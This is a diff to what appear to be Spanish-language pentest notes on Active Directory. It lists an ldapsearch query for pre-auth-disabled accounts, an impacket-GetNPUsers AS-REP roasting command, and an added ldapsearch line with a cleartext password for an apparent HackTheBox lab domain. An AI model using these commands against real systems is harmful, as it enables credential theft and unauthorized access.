@@ -9,6 +9,7 @@
 
 ## con LDAP search
 - `ldapsearch -x -H ldap://<domain_controller> -D "<username>" -w <password> -b "dc=example,dc=com" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"`
+- otro comando de ldapsearch: ldapsearch -x -H ldap://10.10.11.174 -D "SUPPORT\ldap" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" '(sAMAccountName=support)' '*'
 
 ## Solicitar TGT
 - `impacket-GetNPUsers DOMINIO.LOCAL/ -usersfile users.txt -format hashcat -dc-ip <domain_controller_ip>`
